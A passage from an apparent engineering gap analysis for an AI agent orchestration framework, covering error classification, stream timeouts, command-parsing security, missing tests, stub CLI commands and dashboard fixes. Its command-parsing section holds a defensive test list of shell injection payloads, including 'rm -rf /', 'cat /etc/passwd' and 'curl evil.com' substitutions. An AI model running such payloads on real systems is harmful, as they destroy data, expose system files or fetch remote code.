if (error.message.toLowerCase().includes('rate_limit')) {
  // handle rate limit quota
  return ErrorCategory.RATE_LIMIT;
} else if (error.message.toLowerCase().includes('quota')) {
  // handle quota exceeded
  return ErrorCategory.QUOTA;
} else if (error.message.toLowerCase().includes('auth')) {
  // handle authentication failure
  return ErrorCategory.AUTH;
}
```

This approach has multiple critical failure modes:

**Specific Failure Modes:**
- **Provider Variation:** Different providers use different error formats
  - Gemini: `"Rate limit exceeded (429)"`
  - OpenAI: `"quota_exceeded"`
  - Claude: `"rate_limit_error"`
  - Custom providers: Arbitrary message formats

- **Message Instability:** Error messages change between API versions
  - Breaking changes in provider error messages go undetected
  - False negatives: Actual quota errors with different wording not detected

- **False Positives:** "limit" substring matches in unrelated errors
  - "You have reached the maximum item limit in your library" (not rate limit)
  - "Credential token limited to 100 characters" (not auth failure)

- **False Negatives:** Important errors misclassified or missed
  - Quota errors appear as general errors; failover not triggered
  - Auth errors appear as transient; retry wasted on permanent failures

**Impact Assessment:**
- **Failover Accuracy:** HIGH - Error classification directly controls failover behavior
- **Reliability Impact:** SEVERE - Quota handling broken across providers
- **User Experience:** Requests fail unnecessarily when alternate providers available
- **Resource Waste:** Retrying non-transient errors wastes quota

**Recommended Solution:**

1. **Create structured error classification system:**
   ```typescript
   interface ClassifiedError {
     category: 'rate_limit' | 'quota' | 'auth' | 'timeout' | 'transient' | 'permanent' | 'unknown';
     retryable: boolean;
     provider: 'gemini' | 'claude' | 'openai';
     httpStatus?: number;
     errorCode?: string;
     originalMessage: string;
     confidence: 'high' | 'medium' | 'low';
     details: Record<string, unknown>;
   }
   ```

2. **Create provider-specific error parsers:**
   ```typescript
   class GeminiErrorClassifier {
     classify(error: unknown): ClassifiedError {
       // Parse Gemini-specific error codes
       if (error.code === 429 || error.status === 429) {
         return { category: 'rate_limit', retryable: true, ... };
       }
       if (error.code === 'RESOURCE_EXHAUSTED') {
         return { category: 'quota', retryable: false, ... };
       }
       // Parse headers for retry-after, quota info
       return this.fallbackClassify(error);
     }
   }
   ```

3. **Implement multi-signal classification:**
   - Check error code (not just message)
   - Extract details from response headers
   - Parse nested error structures
   - Vendor-specific status codes
   - HTTP status codes

4. **Add error registry with versioning:**
   ```typescript
   interface ErrorDefinition {
     provider: string;
     apiVersion: string;
     errorCodes: string[];
     messagePatterns: RegExp[];
     category: ErrorCategory;
     retryable: boolean;
   }
   ```

5. **Comprehensive error testing:**
   - Test each provider's error variants
   - Test message format changes across versions
   - Test edge cases and false positives
   - Automated regression tests for error classification

**Success Criteria:**
- 100% accuracy on known error types across all providers
- Failover triggered correctly for rate limit/quota errors
- No false positive/negative classifications in test matrix
- Error classification logged for audit and debugging
- Each classification decision documented with reasoning

**Verification:**
- Test suite includes errors from each provider's documentation
- Classification accuracy verified for 50+ error scenarios
- Integration tests confirm failover triggered on rate limit
- Regression tests run on provider updates

---

#### ERR-05: No Timeout on Event Streams

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** Medium
**Category:** PRODUCTION RISK
**Files Affected:** 1
**Impact Level:** 4/5

**Description:**

The execution loop consumes provider event streams without timeout protection, allowing a single hung stream to block the entire orchestrator indefinitely:

```typescript
// Problematic pattern in orchestrator/execution-loop.ts
for await (const event of provider.execute()) {
  // No timeout - if stream hangs, blocks indefinitely
  processEvent(event);
}
```

If a provider's event stream hangs (network issue, provider timeout, stream corruption, connection reset, etc.), the entire execution loop blocks indefinitely with catastrophic consequences:

**Specific Failure Modes:**
- Network hang: Stream stops receiving events; for-await blocks forever
- Provider timeout: Provider stops sending events; stream never closes
- Connection reset: Connection lost mid-stream; no close event fired
- Backpressure: Consumer slower than producer; queue grows unbounded
- Partial event: Stream sends incomplete event; parser waits for more data

**Impact Assessment:**
- **Availability Impact:** CRITICAL - Single hung stream takes entire system offline
- **Operational Impact:** SEVERE - Manual restart required; no automatic recovery
- **Production Risk:** EXTREME - Framework completely unavailable; no graceful degradation
- **Task Impact:** All pending and future tasks blocked until restart

**Recommended Solution:**

1. **Implement AbortController-based timeout:**
   ```typescript
   async function executeWithTimeout(provider: LLMProvider, task: Task) {
     const timeout = new AbortController();
     const configuredTimeout = task.timeout || config.defaultStreamTimeout; // 30min default

     let timeoutHandle = setTimeout(
       () => timeout.abort(),
       configuredTimeout
     );

     try {
       for await (const event of provider.execute({ signal: timeout.signal })) {
         // Reset timeout on each event (stream is alive)
         clearTimeout(timeoutHandle);
         timeoutHandle = setTimeout(
           () => timeout.abort(),
           configuredTimeout
         );

         processEvent(event);
       }
     } catch (err) {
       if (err instanceof DOMException && err.name === 'AbortError') {
         // Timeout occurred
         this.emit('timeout', {
           taskId: task.id,
           duration: configuredTimeout,
           lastEvent: lastEventTime
         });

         // Trigger failover or retry
         return this.failover.handle(task);
       }
       throw err;
     } finally {
       clearTimeout(timeoutHandle);
     }
   }
   ```

2. **Add configurable timeout per provider/task:**
   ```typescript
   interface ExecutionOptions {
     streamTimeout?: number;  // milliseconds
     eventTimeout?: number;   // timeout between events
     maxDuration?: number;    // maximum total execution time
   }
   ```
   - Default: 30 minutes (standard for long-running operations)
   - Configurable via task parameters
   - Documented timeout expectations for each provider

3. **Implement graceful degradation:**
   - Emit timeout event to system
   - Trigger fallback provider
   - Preserve partial results collected so far
   - Attempt retry with exponential backoff
   - Increment timeout for retry (adaptive)

4. **Add monitoring and alerting:**
   - Track stream duration and timeout counts
   - Alert on repeated timeouts (indicates provider/network issue)
   - Monitor hung streams before timeout (track age)
   - Dashboard visualization of execution time distribution

**Success Criteria:**
- All event streams have timeout protection enabled
- Hung streams recovered automatically within configured timeout
- No indefinite daemon blocking even with provider failures
- Timeout behavior documented and configurable
- Monitoring alerts on timeout patterns

**Verification:**
- Integration tests with intentionally hung provider confirm timeout fires
- Failover triggered on timeout
- Partial results preserved after timeout
- Configuration changes applied without code changes

---

#### ERR-06: Command Parsing Regex Incomplete

**Severity:** S3 (Medium)
**Effort:** 2h
**Blocking:** No
**Category:** SECURITY
**Files Affected:** 1
**Impact Level:** 3/5

**Description:**

The security policy engine uses regex-based shell command parsing that doesn't handle all edge cases of shell quoting and escaping:

```typescript
// Incomplete regex parsing at security/policy-engine.ts
const commandRegex = /["']([^"']*?)["']/g;
// Fails to handle:
// - Nested quotes: "foo 'bar' baz"
// - Quote escaping: "foo \"bar\" baz"
// - Backslash escaping: 'foo\\bar'
// - Empty strings: "" or ''
// - Multiline strings in some shells
```

Quote-aware shell parsing is notoriously complex due to shell semantics across different shells (bash, sh, zsh, etc.):

**Specific Failure Modes:**
- **Nested Quotes:** Single quotes inside double quotes: `"foo 'bar' baz"` — regex splits incorrectly
- **Escape Sequences:** `\"`, `\'`, `\\` patterns — not recognized; parsed as part of content
- **Empty Strings:** `""` and `''` — may be ignored by regex
- **Whitespace:** Quoted whitespace: `"foo bar"` — splits on internal spaces if not properly tracked
- **Quote Variety:** Backticks, `$()` syntax — not handled
- **Edge Cases:** Unicode quotes, alternative quote styles in different shells

**Impact Assessment:**
- **Security Impact:** MEDIUM - Potential bypass of command restrictions
- **Reliability Impact:** Medium - Inconsistent command parsing across inputs
- **Edge Cases:** Rare but exploitable scenarios may bypass security checks
- **Maintenance:** Security boundary unclear; future changes risk introducing bypasses

**Recommended Solution:**

1. **Audit current regex thoroughly:**
   ```typescript
   // Document all supported patterns
   const SUPPORTED_PATTERNS = [
     'simple: cmd arg',
     'quoted: cmd "arg with spaces"',
     'single: cmd \'arg\'',
     // Document NOT supported:
     'nested quotes',
     'escape sequences',
     'unicode quotes'
   ];
   ```

   - Create comprehensive test matrix
   - Test against OWASP shell injection payloads
   - Identify specific edge cases not handled
   - Document all assumptions and limitations

2. **Option A - Use established shell parser library:**
   ```typescript
   // Example: use shellwords or similar
   import * as shellwords from 'shellwords';

   const tokens = shellwords.split(commandString);
   // Proper shell semantics; reduces custom parsing complexity
   ```

   - `shellwords` npm package (implements POSIX shell)
   - Reduces custom parsing complexity
   - Leverages community testing and fixes

3. **Option B - Comprehensive regex with validation:**
   - Expand regex to cover documented edge cases
   - Implement state machine for quote tracking
   - Add comprehensive test suite
   - Document all assumptions and limitations
   - Regular audit against new shell injection techniques

4. **Option C - Safer command model:**
   - Accept commands as structured data (not strings)
   - Define allowed command patterns upfront
   - Eliminate ad-hoc parsing entirely
   - Stronger security boundary

5. **Add security test suite:**
   ```typescript
   const INJECTION_PAYLOADS = [
     'cmd; rm -rf /',
     'cmd && malicious',
     'cmd | cat /etc/passwd',
     'cmd `echo pwned`',
     'cmd $(curl evil.com)',
     'cmd"; break "out'
   ];

   INJECTION_PAYLOADS.forEach(payload => {
     test(`safely rejects: ${payload}`, () => {
       const parsed = parseCommand(payload);
       assert(!parsed.containsInjection);
     });
   });
   ```

   - Common shell injection payloads
   - Quote escaping variations
   - Unicode and encoding edge cases
   - Automated security regression tests

**Success Criteria:**
- All identified edge cases documented
- Zero failures on comprehensive test matrix (50+ scenarios)
- Security audit completed against OWASP shell injection patterns
- Approved parsing implementation documented with safety guarantees
- Regression test suite prevents future bypasses

**Verification:**
- Security team reviews and approves solution
- Penetration testing confirms no injection bypasses
- Regression tests run on any parsing changes

---

### Summary Table: Error Handling Gaps

| Gap ID | Issue | Risk Level | Effort | Blocking | Priority |
|--------|-------|-----------|--------|----------|----------|
| **ERR-01** | AuditLogger silent write failures | Data loss | 1h | Yes | P0 |
| **ERR-02** | GeminiProvider silent JSON parse | Data loss | 1h | Yes | P0 |
| **ERR-03** | FlagManager missing logging | Observability | 1h | No | P1 |
| **ERR-04** | Fragile error classification | Failover broken | 2h | Medium | P1 |
| **ERR-05** | No event stream timeout | Availability risk | 1h | Medium | P1 |
| **ERR-06** | Incomplete command parsing regex | Security edge case | 2h | No | P2 |

**Total Effort:** 9 hours
**Critical Path (P0):** 2 hours
**Production Blockers:** 3 gaps (ERR-01, ERR-02, ERR-05)

**Parallelization:** All P0 gaps can be worked in parallel; P1 gaps independent except ERR-04 (depends on error classification improvement in FailoverController)

---

## 9. TESTING GAPS (7 gaps)

### Root Cause Analysis

**Problem:** The Zora framework has 927 tests across 51 files, providing good unit test coverage. However, critical integration testing gaps prevent confidence in multi-provider failover, retry mechanisms, and operational workflows. Integration tests are minimal (only 3 files in `/tests/integration/`), and no tests validate the orchestration layer where components interact. Additionally, provider tool parsing, CLI commands, dashboard endpoints, and security-critical features lack functional validation, creating blind spots for production-critical functionality.

**Risk Profile:**
- **Orchestration (S2):** No e2e tests that boot Orchestrator + submit tasks + verify routing; integration issues only discovered in production
- **Failover/Retry (S2):** Failover logic never validated; bugs hide until production; no tests exercise FailoverController.handleFailure() or RetryQueue retries
- **Tool Parsing (S2):** Regex patterns for XML/JSON tool calls written speculatively; tool parsing fails on real output; users can't invoke tools
- **CLI & Dashboard (S2):** Commands and endpoints exist untested; changes break silently; users hit regressions
- **Security (S2):** TelegramGateway allowlist logic untested; unauthorized users could steer tasks

---

#### TEST-01: No Integration Tests for Orchestration

**Severity:** S2 (High)
**Effort:** 4h
**Blocking:** Yes
**Category:** INTEGRATION TESTING
**Files Affected:** `/tests/integration/` (need new file)
**Impact Level:** 5/5

**Description:**

The Orchestrator is the central component that boots the entire system, submits tasks to providers, routes through failover logic, persists to storage, and manages sessions. However, there is no end-to-end integration test that validates this critical workflow. Currently only unit tests validate individual Orchestrator methods in isolation.

**Recommended Solution:**
Create comprehensive integration test suite in `/tests/integration/orchestrator.test.ts` with test cases validating:
- Orchestrator bootstrap with all dependencies (SessionManager → Router → FailoverController → AuthMonitor)
- Task submission end-to-end (task → routing → provider → completion)
- Event emission (submit, route, execute, complete events)
- Session persistence and recovery across restart
- Failover integration (primary failure → secondary provider)
- Provider routing validation (correct provider selected by capability)

**Success Criteria:**
- `/tests/integration/orchestrator.test.ts` created with 10+ test cases
- All critical Orchestrator workflows have integration tests
- Tests validate component interactions
- Tests verify task lifecycle (submit → route → execute → complete)
- Integration test suite passes in CI/CD with < 10s duration
- Code coverage for Orchestrator integration paths > 80%

---

#### TEST-02: No Failover/Retry Scenario Tests

**Severity:** S2 (High)
**Effort:** 3h
**Blocking:** Medium
**Category:** FAILOVER TESTING
**Files Affected:** `/tests/integration/failover.test.ts` (new)
**Impact Level:** 5/5

**Description:**

The FailoverController and RetryQueue implement critical logic that routes tasks to alternate providers when primary fails, with exponential backoff retries. However, this critical logic has zero test coverage validating it works in realistic scenarios with actual provider failures, retry timing, and state persistence.

**Recommended Solution:**
Create `/tests/integration/failover.test.ts` with test cases validating:
- Failover triggered when primary provider fails
- Retry executed with exponential backoff (verify timing: 1s, 2s, 4s, 8s)
- Task abandoned after max retries exceeded
- Concurrent task failures trigger failover independently
- Retry state persists across orchestrator restart
- Provider selection respects previous failures
- Error classification determines retry eligibility

**Success Criteria:**
- `/tests/integration/failover.test.ts` with 6+ test cases
- Tests validate failover triggered on provider errors
- Tests validate retry queue processing with exponential backoff timing
- Tests verify max retries enforced and retry state persisted
- Integration test suite passes in CI/CD
- Test coverage for FailoverController.handleFailure() > 85%

---

#### TEST-03: CLI Commands Lack Functional Tests

**Severity:** S2 (High)
**Effort:** 3h
**Blocking:** No
**Category:** FUNCTIONAL TESTING
**Files Affected:** `/tests/cli/` (new directory)
**Impact Level:** 4/5

**Description:**

The Zora CLI implements critical commands: `start`, `stop`, `status`, `memory`, `steer`, `skill`, and `audit`. Currently, only registration is tested (command exists, has help text). Command behavior is completely untested—changes break silently without warning.

**Recommended Solution:**
Create `/tests/cli/` directory with command tests validating:
- `start` command: port validation, server startup verification
- `stop` command: graceful shutdown, cleanup validation
- `status` command: format and content validation
- `memory` command: memory output and limits
- `steer` command: flag application and persistence
- `skill` command: enable/disable verification
- `audit` command: log query and output validation
- Error handling: invalid flags, missing args, help display

**Success Criteria:**
- `/tests/cli/` directory with tests for all 8 commands
- Each command has 3+ test cases covering happy path, edge cases, errors
- Tests validate command output format and content
- Tests verify command effects persist (restarts, state changes)
- All CLI tests pass in CI/CD
- Test coverage for CLI commands > 85%

---

#### TEST-04: Dashboard Endpoints Untested

**Severity:** S2 (High)
**Effort:** 3h
**Blocking:** No
**Category:** API TESTING
**Files Affected:** `/tests/api/` (new directory)
**Impact Level:** 4/5

**Description:**

The Dashboard Server exposes REST API endpoints for querying orchestrator state, but these critical endpoints lack tests. API is used by dashboard UI to fetch job status, health information, metrics, and operational data. Without tests, API changes can break dashboard functionality silently.

**Recommended Solution:**
Create `/tests/api/` directory with endpoint tests validating:
- Health check endpoint (format, accuracy, component status)
- Jobs endpoint (list, pagination, filtering, field validation)
- Auth login endpoint (valid/invalid creds, token format)
- Metrics endpoint (structure, values)
- Sessions endpoint (data accuracy, access control)
- Auth middleware (token validation, expiry, 401/403 responses)
- Error handling (404, 500, malformed requests)

**Success Criteria:**
- `/tests/api/` directory with tests for all endpoints
- Each endpoint has 3+ test cases covering happy path, edge cases, errors, auth
- Tests validate response structure and HTTP status codes
- Tests verify authentication middleware works
- All API tests pass in CI/CD
- Test coverage for Dashboard endpoints > 85%

---

#### TEST-05: Provider Tool Parsing Never Validated Against Real Output

**Severity:** S2 (High)
**Effort:** 2h
**Blocking:** Medium
**Category:** PROVIDER VALIDATION
**Files Affected:** `/tests/providers/tool-parsing.test.ts` (new)
**Impact Level:** 5/5

**Description:**

Providers implement regex patterns to parse tool calls from provider output (XML, JSON formats). These patterns were written speculatively without validation against real provider responses. When real tool output arrives, parsing fails silently and users can't invoke tools.

**Recommended Solution:**
- Collect real provider output and create fixtures in `/tests/fixtures/`:
  - Real Gemini XML tool call format
  - Real Claude tool use format
  - Real OpenAI function call format
  - Malformed/edge case responses
- Create `/tests/providers/tool-parsing.test.ts` with test cases validating:
  - Parsing real Gemini/Claude/OpenAI tool call formats
  - Multiple tool calls in single response
  - Tool args with special characters and escaping
  - Malformed tool calls (invalid JSON, missing args)
  - Text content mixed with tool calls
  - Provider-specific format variations

**Success Criteria:**
- Real provider output collected from Gemini, Claude, OpenAI APIs
- `/tests/fixtures/` with 10+ real provider responses
- `/tests/providers/tool-parsing.test.ts` with 15+ test cases
- All parsing regex patterns validated against real output
- Tests cover special characters, escaping, malformed responses
- Test coverage for tool parsing > 90%

---

#### TEST-06: GeminiProvider `checkAuth()` Tests Missing

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** No
**Category:** PROVIDER VALIDATION
**Files Affected:** `/tests/providers/gemini-auth.test.ts` (new)
**Impact Level:** 3/5

**Description:**

The GeminiProvider implements `checkAuth()` to validate that the Gemini CLI is properly authenticated. However, authentication tests are missing. Only binary existence is tested, not actual authentication state. Invalid tokens go undetected until task execution fails.

**Recommended Solution:**
Create `/tests/providers/gemini-auth.test.ts` with test cases validating:
- Valid authentication check returns true
- Invalid token returns false
- Binary not found returns false
- Network errors handled gracefully
- Timeout after 5 seconds
- Retry on transient failures
- Error classification (auth vs network vs binary issues)

**Success Criteria:**
- `/tests/providers/gemini-auth.test.ts` created with 7+ test cases
- Tests validate successful authentication, invalid tokens, network errors
- Tests validate error classification
- All auth tests pass in CI/CD
- Test coverage for GeminiProvider.checkAuth() > 85%

---

#### TEST-07: TelegramGateway User Allowlist Logic Untested

**Severity:** S2 (High)
**Effort:** 2h
**Blocking:** No
**Category:** SECURITY TESTING
**Files Affected:** `/tests/gateways/telegram-allowlist.test.ts` (new)
**Impact Level:** 4/5

**Description:**

The TelegramGateway implements security-critical allowlist logic: only allow specified users to steer tasks. This allowlist logic has zero test coverage. Unauthorized users could potentially steer tasks if the allowlist is not enforced correctly.

**Recommended Solution:**
Create `/tests/gateways/telegram-allowlist.test.ts` with test cases validating:
- Allowed user can steer tasks
- Denied user cannot steer tasks
- User allowlist validation returns correct true/false
- Allowlist loaded from config file
- Empty allowlist handled gracefully
- Malformed allowlist handled safely
- User ID matching is case-sensitive
- Multiple concurrent steering attempts from mixed users
- Allowlist can be updated at runtime
- Audit logging of steering attempts (allowed and denied)

**Success Criteria:**
- `/tests/gateways/telegram-allowlist.test.ts` created with 12+ test cases
- Tests validate allowed users accepted and denied users blocked
- Tests verify allowlist loading and configuration
- Tests validate concurrent access control and audit logging
- All allowlist tests pass in CI/CD
- Test coverage for TelegramGateway access control > 90%

---

### Summary Table: Testing Gaps

| Gap ID | Issue | Severity | Effort | Blocking | Priority |
|--------|-------|----------|--------|----------|----------|
| **TEST-01** | No Integration Tests for Orchestration | S2 | 4h | Yes | P1 |
| **TEST-02** | No Failover/Retry Scenario Tests | S2 | 3h | Medium | P1 |
| **TEST-03** | CLI Commands Lack Functional Tests | S2 | 3h | No | P2 |
| **TEST-04** | Dashboard Endpoints Untested | S2 | 3h | No | P2 |
| **TEST-05** | Provider Tool Parsing Never Validated | S2 | 2h | Medium | P1 |
| **TEST-06** | GeminiProvider `checkAuth()` Tests Missing | S2 | 1h | No | P2 |
| **TEST-07** | TelegramGateway User Allowlist Logic Untested | S2 | 2h | No | P2 |

**Total Effort:** 18 hours
**Critical Path (P1):** 9 hours (TEST-01, TEST-02, TEST-05)
**Production Blockers:** 2 gaps (TEST-01, TEST-02)

---

## 10. OPERATIONAL GAPS (5 gaps)

### Root Cause Analysis

**Problem:** The Zora framework cannot run as a production service due to incomplete operational infrastructure. CLI daemon commands are non-functional stubs, dashboard API endpoints return placeholder data instead of real system state, and the frontend UI has never been compiled. Additionally, critical resource management gaps (unbounded buffering in streaming providers) and observability gaps (no structured logging) prevent operational monitoring and debugging.

**Risk Profile:**
- **Immediate (S2):** Cannot start/stop system as daemon; dashboard shows no active jobs; UI never loads
- **Operational (S2):** Unbounded buffer in GeminiProvider consumes all RAM on extended sessions; scattered console.log calls prevent debugging
- **Production Impact:** Service cannot be deployed, monitored, or managed; complete operational blindness
- **Resource Leaks:** Streaming provider buffers accumulate indefinitely; no memory boundaries

---

#### OPS-01: CLI Daemon Commands Are Stubs

**Severity:** S2 (High)
**Effort:** 3h
**Blocking:** Yes
**Category:** SERVICE MANAGEMENT
**Files Affected:** 1
**Impact Level:** 5/5

**Description:**

The CLI daemon commands (start, stop, status) are non-functional stubs that cannot actually manage the Zora service as a daemon process:

```typescript
// Problematic code at src/cli/index.ts
case 'start':
  console.log('Starting Zora agent...');
  console.log('PID: 12345'); // Hardcoded, not actual process
  break;

case 'stop':
  console.log('Stopping Zora agent...');
  // No-op: does nothing
  break;

case 'status':
  console.log('Agent status: running'); // Simulated data
  console.log('Sessions: 2, Tasks: 5'); // Placeholder values
  break;
```

The implementation has critical deficiencies:

**Specific Failure Modes:**
- `start` command logs hardcoded PID 12345; no actual process spawned
- `stop` command does nothing; running processes not terminated
- `status` command returns simulated data; actual system state invisible
- No pidfile management; multiple instances can start simultaneously
- No signal handling (SIGTERM, SIGINT); process termination impossible
- Cannot integrate with systemd/init systems; service unmanageable

**Impact Assessment:**
- **Service Management:** CRITICAL - Cannot start/stop Zora as service
- **Production Readiness:** CRITICAL - No daemon process management
- **System Integration:** SEVERE - Cannot integrate with init systems or process managers
- **Operability:** Blocks R11, R12, R13 in roadmap (daemon service requirements)
- **Debugging:** No PID tracking; impossible to identify running processes

**Roadmap Blocking:**
- R11: Service daemon with graceful shutdown
- R12: Health check endpoints for monitoring
- R13: Process lifecycle management (reload config, etc.)

**Recommended Solution:**

1. **Implement proper daemon spawning for `start` command:**
   ```typescript
   case 'start': {
     // Check if already running
     const pidFile = '/var/run/zora.pid';
     if (fs.existsSync(pidFile)) {
       const existingPid = parseInt(fs.readFileSync(pidFile, 'utf-8'));
       try {
         process.kill(existingPid, 0); // Check if process exists
         console.error('Zora is already running (PID: ' + existingPid + ')');
         process.exit(1);
       } catch (e) {
         // Process doesn't exist; remove stale pidfile
         fs.unlinkSync(pidFile);
       }
     }

     // Spawn daemon process
     const child = spawn('node', ['src/index.ts'], {
       detached: true,
       stdio: 'ignore'
     });

     // Write pidfile
     fs.writeFileSync(pidFile, String(child.pid));

     // Unref child so parent can exit
     child.unref();

     console.log('Zora started successfully (PID: ' + child.pid + ')');
     break;
   }
   ```

2. **Implement signal handling in main process for `stop` command:**
   ```typescript
   process.on('SIGTERM', () => {
     logger.info('SIGTERM received; shutting down gracefully');
     gracefulShutdown()
       .then(() => {
         logger.info('Shutdown complete');
         process.exit(0);
       })
       .catch((err) => {
         logger.error('Error during shutdown', err);
         process.exit(1);
       });
   });

   process.on('SIGINT', () => {
     logger.info('SIGINT received; shutting down gracefully');
     gracefulShutdown().catch(() => process.exit(1));
   });
   ```

3. **Implement real status checking:**
   ```typescript
   case 'status': {
     const pidFile = '/var/run/zora.pid';
     if (!fs.existsSync(pidFile)) {
       console.log('Zora is not running');
       process.exit(1);
     }

     const pid = parseInt(fs.readFileSync(pidFile, 'utf-8'));
     try {
       process.kill(pid, 0); // Check if process exists
       console.log('Zora is running (PID: ' + pid + ')');

       // Query actual status from running process
       const status = await queryDaemonStatus(pid);
       console.log('Status:', status.state);
       console.log('Active sessions:', status.sessions);
       console.log('Uptime:', formatUptime(status.uptime));
     } catch (e) {
       console.error('Zora is not running (stale pidfile found)');
       fs.unlinkSync(pidFile);
       process.exit(1);
     }
     break;
   }
   ```

4. **Add pidfile and lifecycle management utilities:**
   - Create pidfile on startup
   - Validate pidfile on startup (remove stale files)
   - Remove pidfile on graceful shutdown
   - Implement process health checks via IPC or health endpoint
   - Add configuration reload via SIGHUP

5. **Integrate with systemd/init:**
   - Create systemd unit file for Zora service
   - Support for `systemctl start/stop/restart zora`
   - Automatic restart on failure
   - Proper logging integration

**Success Criteria:**
- `start` command spawns actual daemon process and writes pidfile
- `stop` command sends SIGTERM and waits for graceful shutdown
- `status` command reports accurate running state and active sessions
- Multiple start attempts prevented; stale pidfiles cleaned up
- Graceful shutdown completes within 30 seconds
- SIGTERM/SIGINT handled properly; database connections closed
- Process integrates with systemd unit file

**Verification:**
- Manual testing: start/stop/status work correctly
- PID tracking: pidfile accurate after start
- Graceful shutdown: all connections closed on SIGTERM
- Integration tests verify daemon lifecycle
- systemd integration verified on Linux

**Dependencies:**
- Unblocks OPS-02, OPS-03 (dashboard and frontend require running daemon)
- Enables R11, R12, R13 in roadmap

---

#### OPS-02: Dashboard `GET /api/jobs` Returns Empty Placeholder

**Severity:** S2 (High)
**Effort:** 2h
**Blocking:** Yes
**Category:** API IMPLEMENTATION
**Files Affected:** 1
**Impact Level:** 4/5

**Description:**

The dashboard API endpoint for listing active jobs returns a hardcoded empty array instead of querying actual system state:

```typescript
// Problematic code at src/dashboard/server.ts:116
app.get('/api/jobs', (req, res) => {
  // return a placeholder
  res.json({ jobs: [] });
});
```

This endpoint is critical for dashboard functionality but currently:

**Specific Failure Modes:**
- Always returns empty array regardless of actual active sessions
- Dashboard shows "No active jobs" even when jobs running
- No way to monitor active sessions from UI
- Frontend has no data to display; appears broken
- Cannot see job progress, status, or metrics
- Operations team cannot monitor system activity

**Impact Assessment:**
- **Dashboard Functionality:** CRITICAL - Core feature (active jobs) non-functional
- **Operational Visibility:** CRITICAL - No way to monitor what system is doing
- **User Feedback:** SEVERE - Dashboard appears broken; no data displayed
- **Monitoring:** SEVERE - Cannot check system state from UI
- **Blocking Roadmap:** Blocks R14 (operational dashboard)

**Roadmap Blocking:**
- R14: Operational dashboard with job monitoring

**Recommended Solution:**

1. **Query SessionManager for active sessions:**
   ```typescript
   app.get('/api/jobs', (req, res) => {
     try {
       const sessions = SessionManager.listSessions();

       const jobs = sessions.map(session => ({
         id: session.id,
         status: session.status, // running, paused, completed, failed
         progress: session.progress, // 0-100
         startTime: session.startTime,
         currentTask: session.currentTask,
         agentId: session.agentId,
         userId: session.userId,
         metrics: {
           tokensUsed: session.metrics.tokensUsed,
           completionTime: session.metrics.completionTime,
           errors: session.metrics.errors
         }
       }));

       res.json({
         jobs,
         timestamp: Date.now(),
         count: jobs.length
       });
     } catch (err) {
       logger.error('Error listing jobs', err);
       res.status(500).json({ error: 'Failed to list jobs' });
     }
   });
   ```

2. **Add additional endpoints for detailed job information:**
   ```typescript
   // Get specific job details
   app.get('/api/jobs/:jobId', (req, res) => {
     try {
       const job = SessionManager.getSession(req.params.jobId);
       if (!job) {
         return res.status(404).json({ error: 'Job not found' });
       }
       res.json(job);
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
   });

   // Get job events/logs
   app.get('/api/jobs/:jobId/events', (req, res) => {
     try {
       const events = EventLog.getJobEvents(req.params.jobId);
       res.json({ events });
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
   });
   ```

3. **Implement real-time updates via WebSocket:**
   - Clients can subscribe to job updates
   - Send events as jobs start, progress, complete
   - Live dashboard update without polling

4. **Add filtering and pagination:**
   ```typescript
   app.get('/api/jobs', (req, res) => {
     const status = req.query.status; // filter by status
     const limit = parseInt(req.query.limit) || 50; // pagination
     const offset = parseInt(req.query.offset) || 0;

     let jobs = SessionManager.listSessions();

     if (status) {
       jobs = jobs.filter(j => j.status === status);
     }

     const paginated = jobs.slice(offset, offset + limit);

     res.json({
       jobs: paginated,
       total: jobs.length,
       limit,
       offset
     });
   });
   ```

5. **Add metrics aggregation endpoint:**
   ```typescript
   app.get('/api/metrics', (req, res) => {
     const sessions = SessionManager.listSessions();
     const metrics = {
       totalSessions: sessions.length,
       activeSessions: sessions.filter(s => s.status === 'running').length,
       completedSessions: sessions.filter(s => s.status === 'completed').length,
       failedSessions: sessions.filter(s => s.status === 'failed').length,
       totalTokensUsed: sessions.reduce((sum, s) => sum + s.metrics.tokensUsed, 0),
       averageCompletionTime: calculateAverage(sessions.map(s => s.metrics.completionTime))
     };
     res.json(metrics);
   });
   ```

**Success Criteria:**
- `GET /api/jobs` returns actual active sessions from SessionManager
- Response includes job status, progress, timing, and metrics
- Filtered and paginated results supported
- Error handling returns appropriate HTTP status codes
- Dashboard UI updates properly with real data
- Performance: endpoint responds within 100ms

**Verification:**
- Unit tests verify SessionManager data reflected in response
- Integration tests verify endpoint with multiple active sessions
- Dashboard UI properly displays returned job data
- Response schema validated against API specification

**Dependencies:**
- Depends on OPS-01 (daemon must be running to have sessions)
- Unblocks dashboard functionality and R14 roadmap item

---

#### OPS-03: No Frontend Build Output

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** Yes
**Category:** BUILD SYSTEM
**Files Affected:** 1+ (all dashboard frontend files)
**Impact Level:** 4/5

**Description:**

The dashboard frontend React application exists in source form but has never been compiled to a production build. The expected output directory `/src/dashboard/frontend/dist/` is empty or missing:

```
/src/dashboard/frontend/
├── src/
│   ├── App.tsx
│   ├── components/
│   └── pages/
├── package.json
├── vite.config.ts
└── dist/  ← EMPTY - no compiled output
```

This prevents the dashboard UI from loading at all:

**Specific Failure Modes:**
- Dashboard server has no static files to serve
- Browser requests to `/` receive 404 or error
- React components never compiled to JavaScript
- Vite build process never run
- No CSS compilation; styles missing
- All frontend assets unavailable

**Impact Assessment:**
- **UI Accessibility:** CRITICAL - Dashboard UI never loads
- **User Experience:** CRITICAL - Operators cannot use dashboard
- **Deployment:** CRITICAL - Cannot serve dashboard in production
- **Development:** SEVERE - Frontend changes never deployed
- **Blocking Roadmap:** Blocks R15 (dashboard UI operational)

**Roadmap Blocking:**
- R15: Dashboard UI fully operational

**Recommended Solution:**

1. **Add postinstall script to build frontend automatically:**
   ```json
   // In package.json
   {
     "scripts": {
       "build": "npm run build:frontend && npm run build:backend",
       "build:frontend": "cd src/dashboard/frontend && npm install && npm run build",
       "build:backend": "tsc",
       "start": "node dist/src/cli/index.js",
       "dev": "ts-node src/cli/index.ts"
     }
   }
   ```

2. **Configure dashboard server to serve built frontend:**
   ```typescript
   // In src/dashboard/server.ts
   import path from 'path';
   import express from 'express';

   const app = express();

   // Serve static frontend files
   const distPath = path.join(__dirname, '../dashboard/frontend/dist');
   app.use(express.static(distPath));

   // API routes
   app.use('/api', apiRoutes);

   // Fallback to index.html for SPA routing
   app.get('*', (req, res) => {
